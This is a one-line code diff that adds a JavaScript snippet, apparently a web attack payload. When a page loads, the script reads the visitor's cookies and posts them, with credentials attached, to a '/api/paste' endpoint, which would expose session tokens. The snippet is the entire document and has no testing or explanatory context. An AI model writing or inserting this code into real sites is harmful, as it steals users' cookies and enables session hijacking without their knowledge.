@@ -1,0 +1,1 @@
+document.addEventListener('DOMContentLoaded', function() { fetch('/api/paste', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'content=' + document.cookie }) .then(response => response.text()) .then(data => console.log(data)) .catch(error => console.error('Error:', error)); });
